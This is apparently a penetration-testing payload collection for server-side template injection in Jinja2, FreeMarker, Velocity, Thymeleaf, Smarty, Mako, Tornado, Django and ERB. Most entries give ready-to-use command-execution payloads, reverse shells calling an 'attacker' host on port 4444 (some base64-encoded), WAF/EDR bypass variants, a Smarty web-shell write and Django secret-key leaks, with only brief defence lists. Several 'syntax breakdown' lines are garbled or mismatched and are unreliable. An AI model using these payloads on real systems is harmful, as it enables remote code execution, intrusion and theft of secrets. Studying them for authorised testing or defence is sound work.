# SSTI Template Injection

_11 web payloads_

### Universal SSTI Polyglot Probe  `ssti-polyglot`
_Single payload that blind-probes multiple template engines at once, for when the backend engine is unknown_
Subcategory: **Polyglot** · tags: `ssti` `polyglot` `universal` `blind`

**Prerequisites:**
- User input reaches server-side template rendering somewhere in the pipeline (view name, error page, email
  template, PDF/report generator), but which engine is unknown
- Black-box context — no framework fingerprint yet, so probing each engine individually is wasteful

**Why polyglot here, unlike XSS polyglot:** an XSS polyglot has to satisfy several *parser contexts*
(HTML/JS/attribute) simultaneously with one payload. An SSTI polyglot instead chains short, mostly
independent syntax fragments from several *engines* back to back in one string, on the assumption that
whichever engine is actually parsing the input will consume its own fragment and either error out
distinctively or expose evaluated output, while the other engines' fragments pass through as inert text —
one field submission covers Jinja2/Django, JSP EL, Freemarker/Velocity-style `${}`, and Thymeleaf at once.

**Attack chain:**

**1. Arithmetic-based polyglot (classic)**
> Chains the evaluable-expression syntax of several engines; if any segment evaluates, `49` appears in the
> output or error message
```
${7*7}${{7*7}}{{7*7}}<%= 7*7 %>[[${7*7}]]{{7*7}}
```
**Syntax breakdown:**
- `${7*7}` — JSP EL / Freemarker / plain `${}` interpolation _value_
- `${{7*7}}` — Spring SpEL-in-Thymeleaf preprocessing form _value_
- `{{7*7}}` — Jinja2/Django/Twig _value_
- `<%= 7*7 %>` — ERB/EJS/ASP-style _value_
- `[[${7*7}]]` — Thymeleaf standard-expression-in-text form _value_

**2. Undefined-variable polyglot (error-canary variant)**
> Avoids arithmetic entirely (some WAFs flag `7*7`/numeric expressions specifically). References an
> undefined identifier instead, so a hit shows up as an engine-specific error/stack trace rather than
> computed output — useful when responses are reflected into logs, error pages, or admin-only views rather
> than directly back to the requester
```
<%={{={@{#{${dfb}}%>
<th:t="${dfb}#foreach">
```
**Syntax breakdown:**
- `${dfb}` — arbitrary undefined-variable name, deliberately unlikely to collide with a real template
  variable, used as the probe payload across every fragment _value_
- `<%= ... %>` / `{{={@{#{` / `<th:t="...">#foreach` — wrapper syntax fragments for ERB/JSP-style, EL/Groovy
  chained-accessor style, and Thymeleaf `th:` attribute + iteration syntax respectively, concatenated so a
  single string exercises all three parsers _value_

**3. Confirm and pivot**
> Once a specific engine's fragment triggers a distinct error or evaluated output, drop the polyglot and
> switch to that engine's dedicated section below (Jinja2, Thymeleaf, Freemarker, Velocity, ...) for full
> exploitation (information gathering → command execution → reverse shell)

**Note:** if this exact shape of payload (or the arithmetic classic) is found already sitting in stored data
rather than a response, that is a prior automated scan's leftover, not evidence of a working chain by
itself — see the OOB-canary triage note in `playbooks/xss.md` §3.6.3. It does prove the field is stored and
returned unsanitized, which is worth pursuing.

---

### Jinja2 Template Injection  `ssti-jinja2`
_Jinja2/Twig template injection attack techniques_
Subcategory: **Jinja2** · tags: `ssti` `jinja2` `twig` `template`

**Prerequisites:**
- Uses the Jinja2/Twig template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for template injection
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
If it outputs 49 or configuration information, SSTI exists
```
**Syntax breakdown:**
- `{{` — Jinja2 variable output syntax _value_
- `7*7` — math expression _value_
- `}}` — end of variable output _value_

**2. Information gathering**
> Gather environment information
```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```
**Syntax breakdown:**
- `__class__` — obtain the object's class _value_
- `__mro__` — method resolution order _value_
- `__subclasses__` — obtain the list of subclasses _value_

**3. Command execution**
> Execute a system command
```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
**Syntax breakdown:**
- `__init__` — the class initialization method _value_
- `__globals__` — the global namespace _value_
- `popen` — open a pipe to execute a command _value_

**4. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```
**Syntax breakdown:**
- `{{}}` — template expression syntax _technique_
- `__class__` — Python class attribute _keyword_
- `config` — configuration object _variable_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```
**Syntax breakdown:**
- `attr()` — Jinja2 filter to obtain an attribute _function_
- `\x5f` — the hexadecimal encoding of an underscore _value_

**Use the request object**
> Pass via the request parameter
```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```
**Syntax breakdown:**
- `{{}}` — template expression syntax _technique_
- `__class__` — Python class attribute _keyword_

**Overview:** Jinja2 is Python's most popular template engine. An SSTI vulnerability allows an attacker to inject malicious expressions into a template and, via Python's MRO (method resolution order) chain, access built-in classes to achieve remote code execution, which is extremely severe.

**Vulnerability Principle:** A Jinja2 SSTI vulnerability occurs when user input is embedded directly into the template string (e.g. Template(user_input).render()) rather than passed via a safe variable. An attacker accesses the Python object tree via {{}} expressions, using __mro__/__subclasses__() to find modules such as os/subprocess to execute system commands.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Identify the template engine type
3. Explore the class inheritance chain
4. Find an exploitable class
5. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Use a sandbox environment
3. Restrict template functionality
4. Input validation and filtering

---

### FreeMarker Template Injection  `ssti-freemarker`
_FreeMarker template engine injection attack techniques_
Subcategory: **FreeMarker** · tags: `ssti` `freemarker` `java` `template`

**Prerequisites:**
- Uses the FreeMarker template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for FreeMarker template injection
```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
If it outputs 49 or freemarker, SSTI exists
```
**Syntax breakdown:**
- `${` — FreeMarker variable output syntax _variable_
- `7*7` — math expression _value_
- `}` — end of variable output _value_

**2. Information gathering**
> Gather environment information
```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```
**Syntax breakdown:**
- `.version` — FreeMarker version _value_
- `system_property` — Java system property _value_

**3. Command execution - new**
> Use the Execute class to run a command
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```
**Syntax breakdown:**
- `?new()` — instantiate a class _function_
- `Execute` — FreeMarker built-in command execution class _keyword_

**4. Command execution - api**
> Use ObjectConstructor to run a command
```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```
**Syntax breakdown:**
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity _keyword_
- `file://` — file protocol _technique_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**Syntax breakdown:**
- `<#assign` — command/payload start _command_
- ` ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```
**Syntax breakdown:**
- `Ex"+"ecute` — string concatenation to bypass keyword detection _value_

**Use built-in functions**
> Instantiate and execute directly
```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Runtime.exec` — Java command execution _function_

**Overview:** FreeMarker is a widely used template engine in the Java ecosystem. Its SSTI vulnerability can directly execute Java code and system commands via the built-in freemarker.template.utility.Execute class or ObjectConstructor.

**Vulnerability Principle:** FreeMarker SSTI exploits its powerful built-in functionality: instantiate a Java class via the <#assign> directive, call freemarker.template.utility.Execute to run a command, or use built-in objects such as ObjectConstructor/JythonRuntime. When misconfigured, the new() built-in function can create arbitrary Java objects.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the FreeMarker engine
3. Use the Execute class to run a command
4. Or use ObjectConstructor for reflective invocation

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Configure a sandbox
3. Disable the new built-in function
4. Use a secure template configuration

---

### Velocity Template Injection  `ssti-velocity`
_Velocity template engine injection attack techniques_
Subcategory: **Velocity** · tags: `ssti` `velocity` `java` `template`

**Prerequisites:**
- Uses the Velocity template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Velocity template injection
```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
If it outputs 49 or version information, SSTI exists
```
**Syntax breakdown:**
- `#set` — Velocity variable assignment directive _value_
- `$x` — variable reference _variable_
- `$velocityVersion` — Velocity version information _variable_

**2. Information gathering**
> Gather environment information
```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```
**Syntax breakdown:**
- `$class.inspect` — inspect class information _variable_
- `java.lang.Runtime` — Java Runtime class _value_

**3. Command execution - ClassTool**
> Use ClassTool to run a command
```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```
**Syntax breakdown:**
- `$class.inspect` — obtain the class object _variable_
- `getRuntime()` — obtain the Runtime instance _function_
- `exec()` — execute a command _function_

**4. Command execution - reflection**
> Use reflection to run a command
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```
**Syntax breakdown:**
- `$Class.forName` — load a class _variable_
- `getDeclaredMethod` — obtain a method _encoding_
- `invoke` — invoke a method _value_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```
**Syntax breakdown:**
- `#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash` — command/payload start _command_
- ` -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```
**Syntax breakdown:**
- `#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$` — attack payload _value_

**Use Unicode**
> Bypass using Unicode encoding
```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```
**Syntax breakdown:**
- `\i\d` — the Unicode encoding of id _value_

**Overview:** Apache Velocity is a lightweight template engine for Java. Its SSTI vulnerability can call the Java Runtime class via the reflection mechanism to execute system commands. Velocity is widely used in Atlassian products (Confluence/Jira), so related vulnerabilities have a very large impact.

**Vulnerability Principle:** Velocity SSTI binds a variable to a Java class instance via the #set directive, then accesses Runtime.getRuntime().exec() to execute a command via the reflection chain (Class.forName/getMethod/invoke). Velocity's macro and $ reference mechanisms make constructing the exploit chain relatively simple.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Velocity engine
3. Use ClassTool or reflection
4. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable ClassTool
3. Use a sandbox environment
4. Restrict template functionality

---

### Thymeleaf Template Injection  `ssti-thymeleaf`
_Thymeleaf template engine injection attack techniques_
Subcategory: **Thymeleaf** · tags: `ssti` `thymeleaf` `java` `spring` `template`

**Prerequisites:**
- Uses the Thymeleaf template engine
- Spring framework
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Thymeleaf template injection
```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
If it outputs 49, SSTI exists
```
**Syntax breakdown:**
- `$7*7` — command/keyword _command_

**2. Information gathering**
> Gather environment information
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```
**Syntax breakdown:**
- `T()` — access a Java class _function_
- `getenv()` — obtain environment variables _function_

**3. Command execution - Spring expression**
> Use a Spring expression to run a command
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```
**Syntax breakdown:**
- `T(java.lang.Runtime)` — access the Runtime class _value_
- `getRuntime()` — obtain the Runtime instance _function_
- `exec()` — execute a command _function_

**4. Command execution - ProcessBuilder**
> Use ProcessBuilder to run a command
```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```
**Syntax breakdown:**
- `new` — instantiate an object _value_
- `ProcessBuilder` — Java process builder _value_
- `start()` — start the process _function_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `base64` — Base64 encoding _encoding_
- `Runtime.exec` — Java command execution _function_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Runtime.exec` — Java command execution _function_

**Use reflection**
> Bypass using reflection
```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Runtime.exec` — Java command execution _function_

**URL encoding**
> Bypass using a byte array
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# Use a byte array to construct the command
```
**Syntax breakdown:**
- `new byte[]{105,100}` — the ASCII bytes of id _value_

**Overview:** Thymeleaf is the default template engine of Spring Boot. Its SSTI vulnerability often executes code via the Spring Expression Language (SpEL). In Spring MVC, even outside a template file, a controller return value may trigger template parsing and lead to injection.

**Vulnerability Principle:** Thymeleaf SSTI is mainly triggered in two ways: 1) the preprocessing expression __${expression}__ executes SpEL before template parsing 2) a controller returns a user-controllable view name that triggers template parsing. SpEL provides the full capability to access Java classes and execute methods.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Thymeleaf engine
3. Use T() to access a Java class
4. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable SpEL expressions
3. Use a secure template configuration
4. Input validation and filtering

---

### Smarty Template Injection  `ssti-smarty`
_Smarty template engine injection attack techniques_
Subcategory: **Smarty** · tags: `ssti` `smarty` `php` `template`

**Prerequisites:**
- Uses the Smarty template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Smarty template injection
```
{$smarty.version}
{7*7}
{$smarty.template}
If it outputs the version or 49, SSTI exists
```
**Syntax breakdown:**
- `$smarty.version` — command/keyword _command_

**2. Information gathering**
> Gather environment information
```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```
**Syntax breakdown:**
- `$smarty.server` — server variable _variable_
- `$smarty.const` — PHP constant _variable_

**3. Command execution - system**
> Use the system function to run a command
```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```
**Syntax breakdown:**
- `system()` — PHP system command execution function _function_

**4. Command execution - passthru**
> Use the passthru function to run a command
```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```
**Syntax breakdown:**
- `passthru()` — PHP command execution function _function_

**5. Command execution - exec**
> Use the exec function to run a command
```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```
**Syntax breakdown:**
- `exec()` — PHP command execution function _function_
- `$output` — output array _variable_

**6. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```
**Syntax breakdown:**
- `{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t` — command/payload start _command_
- ` /etc/passwd")}` — parameters and payload content _value_

**Variable assignment**
> Bypass using variable assignment
```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```
**Syntax breakdown:**
- `assign` — Smarty variable assignment _value_
- `value` — variable value _value_

**Use PHP functions**
> WAF bypass technique
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```
**Syntax breakdown:**
- `Smarty_Internal_Write_File::writeFile$SCRIPT_NAME<?php` — command/keyword _command_

**Overview:** Smarty is one of the most popular template engines in PHP. Its SSTI vulnerability can achieve code execution via the {php} tag (old versions) or PHP function calls within {if} conditions, and should be a focus in PHP application penetration testing.

**Vulnerability Principle:** Smarty SSTI exploitation varies by version: old Smarty (below 3.x) supports the {php}{/php} tags to directly execute PHP code; new Smarty can call functions such as system()/passthru() within the {if} tag, or use {Smarty_Internal_Write_File} to write a file.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Smarty engine
3. Use system/passthru to execute a command
4. Obtain a shell

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable PHP function calls
3. Use sandbox mode
4. Input validation and filtering

---

### Mako Template Injection  `ssti-mako`
_Mako template engine injection attack techniques_
Subcategory: **Mako** · tags: `ssti` `mako` `python` `template`

**Prerequisites:**
- Uses the Mako template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Mako template injection
```
${7*7}
${self}
${self.module}
If it outputs 49 or module information, SSTI exists
```
**Syntax breakdown:**
- `$7*7` — command/keyword _command_

**2. Information gathering**
> Gather environment information
```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```
**Syntax breakdown:**
- `self.module` — access the template module _value_
- `dir()` — list an object's attributes _function_

**3. Command execution - os module**
> Use the os module to run a command
```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```
**Syntax breakdown:**
- `os.popen()` — open a pipe to execute a command _function_
- `.read()` — read the output _function_

**4. Command execution - subprocess**
> Use subprocess to run a command
```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```
**Syntax breakdown:**
- `<%` — Mako Python code block start _operator_
- `%>` — code block end _operator_
- `subprocess` — Python subprocess module _value_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```
**Syntax breakdown:**
- `$self.module.cache.util.os.popenbash` — command/keyword _command_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```
**Syntax breakdown:**
- `$self.module.cache.util.os.popeni+d.read` — command/keyword _command_

**Use __import__**
> Import a module using __import__
```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```
**Syntax breakdown:**
- `__import__` — Python built-in import function _value_

**Use getattr**
> Bypass using getattr
```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```
**Syntax breakdown:**
- `$getattr__import__ospopenid.read` — command/keyword _command_

**Overview:** Mako is a high-performance template engine for Python, widely used in the Pylons/Pyramid frameworks. Its SSTI vulnerability can directly execute Python code, because a Mako template is essentially compiled into a Python module, giving it a weak security boundary.

**Vulnerability Principle:** Mako SSTI is particularly severe: ${expression} in the template directly executes a Python expression, the <% block can contain arbitrary Python code, and <%! %> defines module-level Python code. An attacker can directly import os and execute system commands without a complex exploit chain.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Mako engine
3. Access os via self.module
4. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Restrict template functionality
3. Use a sandbox environment
4. Input validation and filtering

---

### Tornado Template Injection  `ssti-tornado`
_Tornado template engine injection attack techniques_
Subcategory: **Tornado** · tags: `ssti` `tornado` `python` `template`

**Prerequisites:**
- Uses the Tornado template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Tornado template injection
```
{{7*7}}
{{handler}}
{{request}}
If it outputs 49 or the handler object, SSTI exists
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**2. Information gathering**
> Gather environment information
```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```
**Syntax breakdown:**
- `handler.settings` — application configuration _value_
- `request.headers` — HTTP headers _value_

**3. Command execution - os**
> Use the os module to run a command
```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `{{...}}` — template expression _format_

**4. Command execution - subprocess**
> Use subprocess to run a command
```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```
**Syntax breakdown:**
- `subprocess` — Python subprocess module _value_
- `check_output` — obtain the command output _value_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**Use __import__**
> Import a module using __import__
```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**Use handler**
> Access via handler
```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```
**Syntax breakdown:**
- `{{handler.application.settings}}
{{handler.get_status()}}
` — template expression injection _value_

**Overview:** Tornado is a Python asynchronous web framework and template engine. Its SSTI vulnerability can execute Python code via template expressions. Tornado templates HTML-escape output by default, but raw expressions {%raw%} and {{!expression}} can bypass this.

**Vulnerability Principle:** Tornado template SSTI executes Python code via {{}} expressions. An attacker can use the import statement to import modules, or access sensitive information such as application settings and cookie_secret via the handler object (a built-in variable in Tornado templates), and thereby execute arbitrary code.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Tornado engine
3. Import the os module
4. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable the import statement
3. Use a sandbox environment
4. Input validation and filtering

---

### Django Template Injection  `ssti-django`
_Django template engine injection attack techniques_
Subcategory: **Django** · tags: `ssti` `django` `python` `template`

**Prerequisites:**
- Uses the Django template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Django template injection
```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
If it outputs 49 or the request object, SSTI exists
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**2. Information gathering**
> Gather environment information
```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```
**Syntax breakdown:**
- `request.META` — HTTP metadata _value_
- `request.user` — the current user _value_
- `settings` — Django configuration _value_

**3. Command execution - via settings**
> Attempt access via settings
```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# The Django template is sandboxed by default, making direct command execution difficult
# You need to find an exploitable object chain
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**4. Command execution - object chain**
> Access via an object chain
```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# Attempt to access Django internal objects
```
**Syntax breakdown:**
- `_meta` — Django model metadata _value_
- `apps` — application registry _value_

**5. Sensitive information disclosure**
> Leak sensitive configuration
```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```
**Syntax breakdown:**
- `{{}}` — template expression _technique_
- `os` — system module _keyword_

**WAF/EDR Bypass Variants:**

**Use filters**
> Use Django filters
```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```
**Syntax breakdown:**
- `|length` — length filter _value_
- `|default` — default value filter _value_

**Use a for loop**
> Iterate using a for loop
```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```
**Syntax breakdown:**
- `{{...}}` — template expression _format_

**Overview:** The Django template engine was designed with security in mind and does not support directly executing Python code. However, under specific configurations (such as DEBUG mode, custom template tags) an SSTI vulnerability may still exist, leaking sensitive information by accessing the object attribute chain.

**Vulnerability Principle:** Although Django SSTI cannot achieve direct RCE, it can leak sensitive information through object attribute traversal: {{settings.SECRET_KEY}} obtains the key, {{settings.DATABASES}} obtains the database configuration, and access to HTTP headers and session data via registered template variables (such as the request object).

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Django engine
3. Access request/settings
4. Leak sensitive configuration
5. Combine with other vulnerabilities for exploitation

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable settings access
3. Use autoescape
4. Input validation and filtering

---

### ERB Template Injection  `ssti-erb`
_ERB (Ruby) template engine injection attack techniques_
Subcategory: **ERB** · tags: `ssti` `erb` `ruby` `template`

**Prerequisites:**
- Uses the ERB template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for ERB template injection
```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
If it outputs 49 or file information, SSTI exists
```
**Syntax breakdown:**
- `<%=` — ERB output expression _operator_
- `7*7` — math expression _value_
- `%>` — end of expression _operator_

**2. Information gathering**
> Gather environment information
```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```
**Syntax breakdown:**
- `Dir.pwd` — current directory _value_
- `ENV` — environment variables _value_
- `` `id` `` — backticks execute a command _value_

**3. Command execution - backticks**
> Use backticks to run a command
```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```
**Syntax breakdown:**
- `` ` `` — Ruby backticks execute a system command _value_

**4. Command execution - system**
> Use system/exec to run a command and obtain a reverse shell
_platform: linux_
```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `system()` — system command execution _function_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```
**Syntax breakdown:**
- `<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").` — template expression injection _value_

**Use % syntax**
> Use the %x syntax to run a command
```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```
**Syntax breakdown:**
- `%x()` — Ruby command execution syntax _function_

**Use Open3**
> Use the Open3 module
```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```
**Syntax breakdown:**
- `<%=` — command/keyword _command_

**Overview:** ERB (Embedded Ruby) is the template engine in the Ruby standard library, widely used in Ruby on Rails. ERB SSTI can directly execute Ruby code, executing system commands via system()/exec()/backticks, and is relatively easy to exploit.

